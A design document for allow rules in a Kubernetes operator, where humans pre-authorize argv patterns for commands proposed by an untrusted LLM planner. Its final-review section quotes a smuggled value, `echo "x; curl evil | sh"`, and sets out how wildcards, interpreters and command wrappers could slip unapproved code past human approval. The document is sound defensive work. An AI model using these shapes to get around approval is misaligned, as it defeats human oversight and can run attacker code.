# M6: Allow rules — Design

**Status:** drafted on 2026-10-30 from the main spec, the code, and the M5 follow-ups. The user asked to skip the question round for milestone designs. Calls made without asking are marked *(my call)*.

**Parent spec:** `docs/superpowers/specs/2026-09-26-last-operator-design.md` (the "main spec"): §4.1, §7, §8.3, §9.1–§9.4 and §20. §9.5 (operator suggestions) is M7.

**Inputs:**
- the CRD types `CommandRule`, `ClusterCommandRule` and `CommandRuleSuggestion`, from M0 (`api/v1alpha1`), already carrying the argv-pattern CEL rules;
- the unused `Plan.UncoveredSteps`, `Plan.Generalizations` and `PendingCommand.Generalization` fields;
- the M5c authorization path in the gateway (`authorizePhase`, `recheckAuthorization`, `checkApprover`);
- two decisions the user made about M5 follow-ups (§5 below).

## 1. Goal and done-criterion

Allow rules let Manual mode scale. Once a person decides that a pattern of command is fine for given stages and Providers, matching commands no longer wait for approval. Only humans create rules.

**Done when:** e2e on kind shows a second, similar Intent running without approval because of rules created while approving the first, and `kubectl last audit verify` passes (main spec §20).

## 2. Decisions

| # | Decision | Why |
|---|---|---|
| R1 | **Rules authorize; they never widen policy.** A covered command still has to pass the effective policy (`CheckCommand`: Providers, egress, scripts). A rule only replaces a human approval. | Main spec §9.1. Rules and policy answer different questions: "may this run unattended?" and "may this run at all?". |
| R2 | **Coverage (main spec §9.3).** A command is covered at stage S when one rule, a `CommandRule` in the Intent's namespace or a `ClusterCommandRule`, meets all of these: S is in its `stages`; the command's `providers` are a subset of its `providers`; the command's declared egress is covered by its `egress`, using the policy's covers relation; `run.argv` matches `match.argv`; every `image.install` command matches some entry of `install`; and the command is argv, not a script. A plan is covered when every step is covered. | As written in the spec. |
| R3 | **A step with `${steps…}` references is never covered in M6** *(my call)*. | Rules match the fully resolved argv, which is unknown until the step runs. A per-step check at run time would let a phase start unattended and then stop partway. Follow-up: cover reference positions with `re:` or glob patterns, checked at run time. |
| R4 | **Rules are an authorization source alongside Auto and approvals.** The gateway order becomes: Deny wins; then Auto within D9's limits; then **rules**, when every step is covered; then an Approve; then NeedsApproval or FailedPrecondition. Rules authorize in every stage: Discovery, Create, Update, Remediate, Delete. | Main spec §7 ("skipped when … every command involved matches an allow rule for that stage") and §8.3 ("needs approval (or matching rules)"). Auto stays first, so rules matter in Manual stages and for Remediate and Delete plans outside D9's limits. |
| R5 | **Audit.** A rule-authorized phase writes one `rule.observed` entry for each rule used, with name, scope, UID, resourceVersion and generation (and, from the final review, `spec` and `specHash`: §10, I4). `phase.begin` carries `authorizedBy {kind: rule}`, plus a payload map from step ID to the rule that covers it. Each `command.start` is stamped with the covering rule. | An auditor can tell exactly which rule let each command run. `rule.observed` already exists as an entry type. |
| R6 | **Per-step re-check.** For a rule-authorized phase, RunCommand re-checks the step against the current rules. If the rule was deleted or narrowed, it falls back to a standing Approve (stamped as such, as in M5c), and otherwise refuses the step. A Deny still wins. | The same shape as the Auto re-check: authority is checked when the command runs, not only when the phase opened. |
| R7 | **Matching semantics (main spec §9.2).** A literal matches exactly. A glob (`*`, `?`, `[…]`) matches within one argument and never spans arguments. `re:<RE2>` is anchored to one argument. `...` matches zero or more remaining arguments and appears only last. An invalid `re:` pattern matches nothing, and the gateway logs it. | As written in the spec. Failing closed on a bad regex. |
| R8 | **Admission.** The CRD CEL rules stay (`argv[0]` literal, `...` last). A new ValidatingAdmissionPolicy, `last-rules`, refuses any create or update of either rule kind by the operator's ServiceAccount or by a gateway-namespace ServiceAccount. RBAC changes: the operator gets get/list/watch on both kinds, for display; the gateway gets get/list/watch; neither gets write. | Main spec §9.2 and §4.1. The policy is defence in depth over RBAC. |
| R9 | **The operator shows coverage and skips the wait.** When it records a plan, the operator writes `status.plan.uncoveredSteps` from its own (uncached) read of the rules. When nothing is uncovered, `record` goes straight to the running phase, saying "Running plan … without approval (allow rules)", as Auto does. The gateway decides; on NeedsApproval or no approval, the operator falls back to waiting, reusing M5c's path. Discovery commands work the same way. | Main spec §9.3: "the operator's copy is for display only". |
| R10 | **`kubectl last approve --always-allow`** (and the interactive prompt). For each uncovered step the approver picks one of three: **Exact**, a rule matching the step's argv literally; **Generalized**, an editable pattern; or **Just this once**. Then the CLI creates the rules as the approver, followed by the `IntentApproval`. | Main spec §9.4. |
| R11 | **The generalized pattern comes from the CLI in M6** *(my call)*. A deterministic heuristic keeps `argv[0]` and the leading subcommands, the first non-flag arguments up to 3, as literals. It keeps flag names literal and turns flag values and later positional values into `*`. The approver edits the result before accepting it. If `status.plan.generalizations[step]` or `pendingCommand.generalization` is present, the CLI offers that instead. M7 fills those fields from the LLM. *Amended in the final review (§10, C1 and I2): a flag's separate value becomes `[!-]*`, code never varies, and the CLI ignores the stored generalizations.* | It keeps the turn schema unchanged, which avoids the "compiled grammar too large" risk, and it gives M6 working generalized patterns without an extra LLM call per step. |
| R12 | **The breadth lint is shared code.** `internal/rules.Lint(spec)` warns on: `...` directly after the binary; a glob or regex on a subcommand position of a known destructive verb (`delete`, `rm`, `destroy`, `terminate-*`); file arguments (`-f`, `--filename`, `--from-file`) together with `...` or a glob; and a reminder that rules match argv, not file contents or stdin. The CLI shows the warnings next to example commands the pattern would match, from the current plan. M7's suggestions reuse the same code. | Main spec §9.2. |
| R13 | **What a rule from `--always-allow` holds.** Stages: the plan's stage *(my call; the approver can widen it with `--stages`)*, with Create and Update treated as one class (R15); a teardown entry's rule gets stage `Delete` (R14). Providers: the step's own. Egress: the step's own. Install: one exact pattern for each `image.install` command. Scope: namespace, or cluster with `--cluster`; the cluster form needs RBAC on ClusterCommandRule, which the API server enforces. Name: `<intent>-<step>-<hash8>`, where the hash covers the rule spec. Labels: `last.moogie-labs.com/intent`. `source.createdFrom: approval`. | Rules stay as narrow as the step that prompted them, unless the person widens them on purpose. |
| R14 | **A rule-authorized plan must cover everything it authorizes, not just its steps** *(added after Task 3's review)*. A Create or Update phase that succeeds becomes the executed plan, and the executed plan later authorizes its probes (RunProbes, on every cycle) and its teardown (D9's Auto Delete). So rules authorize a Create or Update plan only when every step, every `resources[].probes[].command` and every `resources[].teardown` command is covered. Steps and probes are matched at the plan's stage, and teardown commands at stage `Delete`. `uncoveredSteps` lists the uncovered entries with IDs `<stepID>`, `probe:<probeID>` and `teardown:<resourceIndex>.<i>`. `Desired` and `outputs` stay unchecked: `Desired` is a description, and outputs only copy covered steps' output into the Intent's own Secret. | Without this, one rule that covers a single step lets an unreviewed, credentialed script run as a probe on every cycle. Task 3's reviewer proved it. |
| R15 | **Create and Update are one class for rule stages** *(added after Task 3's review)*. A rule whose `stages` lists Create or Update covers commands of both stages. | The gateway can't bind the stage of a Create versus an Update plan: Create may legitimately replace an executed plan, the M5 fallback when the audit log can't be read. So a Create-only rule would not really be Create-only. Auto modes already share one `create` key for both. |

## 3. Components

- **`internal/rules`** (new):
  - `Match(pattern []string, argv []string) bool`
  - `Covers(rule lastv1alpha1.CommandRuleSpec, stage, cmd) (bool, reason string)`
  - `Coverage(rules, stage, steps) (covered map[stepID]ruleRef, uncovered []stepID)`
  - `Lint(spec) []Warning`
  - `Generalize(cmd) ArgvPattern`

  The gateway, the operator and the CLI all use this one package, so their answers can't drift apart. Egress coverage reuses the policy package's parsing and covers relation, exported for this.
- **Gateway:**
  - reads both rule kinds through the uncached client;
  - adds rules to `authorizePhase` (R4) and to `recheckAuthorization` (R6);
  - writes `rule.observed` entries and stamps commands (R5).
- **Operator:**
  - RBAC read on both rule kinds;
  - `record` writes `uncoveredSteps` and skips the wait (R9);
  - the fake gateway mirrors R4 and R6.
- **CLI:**
  - `approve --always-allow`, plus the interactive prompt's per-step choice;
  - `kubectl last rules lint <file|->`, which lints a rule file before you apply it;
  - `plan` and `follow` show `uncoveredSteps` and the rule each covered step matched.
- **Chart:**
  - the `last-rules` policy and binding;
  - RBAC for the operator and the gateway;
  - helm-lint checks that neither can write rules.

## 4. Errors

| Condition | Result |
|---|---|
| A rule with an invalid `re:` pattern | It matches nothing; the gateway logs it once per rule and resourceVersion; `rules lint` reports it. |
| A step with `${steps…}` references | Uncovered (R3): the plan needs approval. |
| A rule deleted between BeginPhase and a step | The step falls back to a standing Approve; otherwise it is refused and the phase fails (R6). |
| The operator thinks a plan is covered and the gateway disagrees | NeedsApproval or no approval, so the Intent waits for approval (R9). |
| The operator or a gateway ServiceAccount tries to create a rule | Refused by RBAC and by `last-rules`. |

## 5. Carried from M5 (the user's decisions)

### 5.1 A partially applied Create or Update does not linger after deletion

The user's decision: "I do not want partially applied creates to linger when they're deleted."

- **What counts as partial.** A Create or Update phase anywhere in the Intent's history, older than the executed plan or newer, that did not succeed and ran at least one step. "Ran a step" means the audit log holds a `command.start` or `command.result` for its subject after its `phase.begin` and before its `phase.end`, if it has one. That also catches phases closed as interrupted, which carry no `stepsRun`, and a step a crash cut short, since `command.start` is written before the step runs. An older one counts because a Create that made something, failed and was replanned may have made what the executed plan does not tear down; a history with a partial plan therefore makes an Auto Delete need approval or rules.
- **What tears it down.** The Delete's teardown commands are the union of the executed plan's teardown (if any) and the teardown commands of every partial phase's plan, read from its `phase.begin`. The union is deduplicated by `plan.CommandKey` and kept in order: executed first, then the partial phases from oldest to newest. The operator's permutation check runs against that union.
- **Releasing.** An Intent with no executed plan, no partial phase and no ManagedResources is released at once, as today. One whose union has no teardown commands is released with the Warning `NoTeardown`. This replaces M5a's `PartialCreateNotTornDown` path.
- **Gateway.** A Delete with no executed plan is already allowed by approval, and now by rules. In Auto it falls outside D9's limits, which require a permutation of the executed teardown, so it needs approval or rules.
- **Prompt.** The Delete plan can only reorder the recorded commands, so tolerance is asked for when they are written: the system prompt that Create and Update planning read asks for teardown commands that succeed when the object is already gone or was never created, such as `kubectl delete … --ignore-not-found`, because a plan can stop part way and its teardown still runs. The teardown prompt says when some commands come from plans that did not finish.
- **Failure.** If teardown fails, the result is `TeardownFailed` with the retry annotation, as for any Delete.

### 5.2 The repair limit counts a rolling window too *(my call, as the user asked)*

The consecutive cap of 3 stays as it is, and a window cap is added on top:
- **The rule.** No more than **6 remediations in 24 hours**. The operator keeps the start times of the last 6 remediations in `status.remediationTimes`, as RFC 3339 strings, and drops the ones older than 24 hours.
- **When it applies.** Starting a remediation while 6 are left in the window fails the Intent with `RemediationFailed` and the message "6 remediations in 24h".
- **Resets.** A passing scheduled run resets the consecutive count only. A spec edit clears both, because a new plan starts fresh. A drift that clears before anything is remediated (`DriftCleared`) gives back the start's window entry together with the count.
- **Auto.** Retry with backoff (D10) then applies: each retry finds the window still full and fails again, so the backoff grows from 1m up to 1h.

Why: it bounds the resource that something reverts slowly, which the consecutive cap never catches (the M5c follow-up), without slowing the quick, one-off repair. The numbers are constants for now; making them OperatorConfig settings is a follow-up.

## 6. Security

- **Only humans write rules** (R8). A rule never widens policy (R1).
- **Every rule-authorized command is matched on its resolved argv,** at BeginPhase and again before it runs (R3, R6).
- **Image installs must match too,** so a rule for `aws …` cannot run a binary that an unapproved install placed at `aws` (main spec §9.2).
- **The audit names the exact rule and version** behind each command (R5).
- **The breadth lint is advice, not enforcement.** A broad rule a person writes is honoured; the lint makes the breadth visible. Rules match argv only, not file contents or stdin, and the lint says so.

## 7. Testing

**Unit and envtest:**
- `internal/rules`: literal, glob, `re:` and `...`, including a glob that must not span arguments; invalid regexes; providers, egress and install subsets; scripts never covered; references never covered.
- Gateway: each R4 order case; R6 fallback and refusal; `rule.observed` and the per-step stamps; a Deny over a rule; a ClusterCommandRule; a rule in another namespace ignored.
- Admission: the operator and gateway service accounts cannot write rules.
- Operator: `uncoveredSteps`; skipping the wait when covered; falling back when the gateway disagrees; partial-Create teardown, including union order, dedupe and an interrupted phase; the window cap.
- CLI: Exact, Generalized and Just-this-once flows; `--stages` and `--cluster`; lint output; generalization fixtures.

**e2e on kind:**
- **`TestAllowRulesLetASimilarIntentRun`.** Intent A is approved with `--always-allow`, choosing Generalized for each step. Intent B, with the same request shape but a different name, runs without approval. Its audit shows `authorizedBy {rule}` and `rule.observed` entries, and the chain verifies.
  *As built:* Intent A is approved with `--always-allow=generalized --hash H` (no stdin prompt), and the scripted argv put every differing name after the three literals Generalize keeps (`kubectl create deployment web-a --image=… -n …`), so B's steps, probe and teardown are all covered. The test asserts the `rules` map holds every entry, one `rule.observed` per distinct rule, no `approval.observed` and no IntentApproval for B.
- **`TestDeletingAPartialCreateTearsItDown`.** A Create whose step 2 fails after step 1 made a ConfigMap is deleted. The Delete plan holds the partial plan's teardown, and after approval the ConfigMap is gone.

## 8. Main-spec amendments

- **§4.1:** RBAC on rules for the operator and the gateway, and the `last-rules` policy.
- **§7:**
  - rule-covered plans skip AwaitingApproval;
  - partial-Create teardown;
  - the window cap.
- **§8.3:**
  - rules in the authorization order;
  - the per-step re-check;
  - the audit of rules.
- **§9.2–§9.4:**
  - R3 (references uncovered);
  - R11 (the CLI's generalization in M6);
  - R13 (what an always-allow rule holds);
  - `rules lint`.
- **§5.1:** `status.remediationTimes`.

## 9. Left to the builder

- How M6 splits into tasks, and whether it becomes one plan or two.
- The exact wording of the lint warnings and the CLI prompt.
- The list of known destructive verbs, beyond the ones named in R12.
- Event reasons, and log and metric names.

## 10. Deviations recorded in Task 7

- The e2e approval of Intent A uses `--always-allow=generalized` rather than driving the interactive prompt with stdin; the prompt is covered by CLI unit tests.
- The partial-Create test fails the Intent by scripting the plan `MaxAttempts+1` times, so the replan cap ends it deterministically.
- Main spec §9.2–§9.4 already held everything Tasks 1–6 changed; Task 7 edited nothing there.

## 10.1 Decisions from the final review

- **C1: generalized rules never let code vary.** `rules.Generalize` turned `bash -c "echo hi"` into `[bash -c *]`, so the documented `--always-allow=generalized` flow made an interpreter script a wildcard, in an argv shape the untrusted planner chooses. Now:
  - a flag's separate value (a flag without `=` followed by an argument) becomes `[!-]*`, so it can never stand for a flag (this also fixes `--all-namespaces web`); the empty string stays the empty literal; `--flag=value` keeps `--flag=*`, which cannot add an argument;
  - the value of a code flag (`-c`, `-e`, `-E`, `--eval`, `-Command`, `-command`, `-r`, and `--command`, `-p`, `--print`, `-EncodedCommand`, `-S`, `--split-string`, `-exec`, `-execdir`) stays literal wherever it appears, in either form, so `su root -c id` and `node --eval=…` stay exact too;
  - from an interpreter word on, every argument stays literal. *(my call, stricter than the ruling)* An interpreter is recognized at any position, not only as `argv[0]`, after `--` or after an `exec`/`run` wrapper: wrappers are open-ended (`env`, `xargs`, `sudo`, `timeout`, `docker exec ctr`), so recognizing the word anywhere fails closed. The cost is that an argv naming a resource such as `node` (`kubectl get node web`) is not generalized after that word. The list is the ruling's (`sh`, `bash`, `zsh`, `dash`, `ash`, `ksh`, `python`, `python2`, `python3`, `node`, `perl`, `ruby`, `pwsh`, `powershell`, `php`, `lua`, `Rscript`, `osascript`) plus `mksh`, `csh`, `tcsh`, `fish`, `nodejs`, `deno`, `bun`, `luajit`, `tclsh` and the `awk`s, matched on the base name, case-insensitively, without `.exe` or a trailing version (`/usr/bin/python3.12`);
  - everything after a `--` argument stays literal (escaped);
  - *(added after the fix wave's re-review, which proved `ssh host echo [!-]*` matched `ssh host echo "x; curl evil | sh"`)* command runners are treated like interpreters: from `ssh`, `rsh`, `slogin`, `watch`, `su`, `runuser`, `sudo`, `doas`, `timeout`, `nice`, `nohup`, `stdbuf`, `time`, `env`, `xargs`, `chroot`, `setsid`, `flock`, `ionice`, `taskset`, `unshare` or `nsenter` on, and from a container CLI's `exec` or `run` (`docker`, `podman`, `nerdctl`, `crictl`, `ctr`, `kubectl`, `oc`) unless a later `--` marks the program, every argument stays literal. These words pass the rest on as a remote or `sh -c` command line, or run it as another program whose leading arguments would otherwise use up the literal slots (`timeout 10 kubectl get pods web` must not cover `kubectl delete ns prod`). Code shipped through a cloud API (`aws ssm send-command`, `az vm run-command`, startup-script metadata) is open-ended and outside what rules and lint can see.
  - lint warns (breadth, not "matches nothing") when an interpreter is followed by a non-literal position, when a non-literal position follows `--`, and when a code flag's value is not a literal. A position counts as literal when its pattern matches exactly one string, so Generalize's escaped literals (`a\*b`, `[r]e:x`) are not wildcards; the destructive-verb and file-flag checks use the same test. Generalize's output never triggers these warnings (tested, with the self-match property, on generated argvs).
  - Not handled: a wrapper that hands later positionals to a shell without a code flag (`ssh host cmd …`) still generalizes positionals past the third to `[!-]*`.
- **I2: the CLI ignores operator-written generalizations.** `status.plan.generalizations` and `pendingCommand.generalization` are written by the untrusted operator outside the plan hash, so in M6 the CLI always uses `rules.Generalize` on the entry's own command; the code path that offered them is gone. M7 revisits trusted suggestions.
- **I3: commands with `files`.** A rule matches argv only, so the files a command runs can change under the same rule. `approve --always-allow` warns for each entry that carries `files`; lint adds a breadth finding for a position (or `--flag=` value, or `re:`) naming a path under `/work/`, the sandbox's files root. The README now says exactly when lint warns.
- **I4: `rule.observed` says what the rule allowed.** Its payload adds `spec`, the rule's spec in canonical JSON, and `specHash`, `sha256:<hex>` of those bytes.
- **I5:** the README has an "Upgrading to M6" section: apply the CRDs by hand, older partial plans join the Delete union, and Provider credentials must not be able to write rules or approvals.
- **I6: step IDs cannot contain `:`.** Coverage entry IDs use `probe:` and `teardown:`, so `plan.validateSteps` refuses a step ID with `:`; `agent.ParseTurn` reaches the same check through `plan.Validate`, so the model gets a correction, and the prompt says so.
- **Minor:** the gateway logs any rule pattern that matches nothing, chosen by the typed `Finding.Nothing`, not by the "invalid regex" text; `rules-policy.yaml` says DELETE is deliberately not matched (deleting a rule only narrows what runs); main spec §7 says a rule added after a plan is already waiting does not release it.
- **Declined:** a generalized teardown rule at stage `Delete` (for example `kubectl delete deployment [!-]* -n [!-]*`) lets any Intent being deleted in that namespace delete matching objects without approval. That is what such a rule says; lint flags wildcards after destructive verbs, and the approver sees the warning before accepting.
